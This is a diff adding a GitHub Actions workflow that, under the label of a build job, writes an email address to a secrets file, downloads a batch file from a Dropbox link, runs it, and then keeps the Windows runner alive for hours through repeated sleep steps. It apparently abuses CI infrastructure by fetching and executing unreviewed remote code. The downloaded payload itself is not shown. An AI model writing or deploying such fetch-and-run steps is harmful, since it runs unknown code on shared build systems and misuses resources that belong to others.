@@ -1,0 +1,60 @@
+name: A8
+
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: windows-latest
+
+    steps:
+    
+      - name: Setting Up
+        run: echo "EMAIL_SECRET=ainxd@hldrive.com" > secrets.txt
+      
+      - name: Waiting
+        run: start-sleep 10
+      
+      - name: Downloading
+        run: wget "https://www.dropbox.com/scl/fi/ypcru14dbac39y2xc0kvs/down.bat?rlkey=xwqih8zsxw6p7vc7t8b0gj8vl&dl=1" -OutFile "down.bat"
+         cmd /c down.bat
+      
+      - name: A
+        run: |
+         start-sleep 300
+         start-sleep -s 300
+      
+      - name: B
+        run: |
+         start-sleep 300
+         start-sleep -s 300
+
+      - name: C
+        run: |
+         start-sleep 300
+         start-sleep -s 300
+
+      - name: D
+        run: |
+         start-sleep 300
+         start-sleep -s 300
+
+      - name: E
+        run: |
+         start-sleep 300
+         start-sleep -s 300
+
+      - name: F
+        run: |
+         start-sleep 300
+         start-sleep -s 300
+      
+      - name: G
+        run: |
+         start-sleep 300
+         start-sleep -s 300
+      
+      - name: H
+        run: |
+         start-sleep 10800
+         start-sleep -s 10800
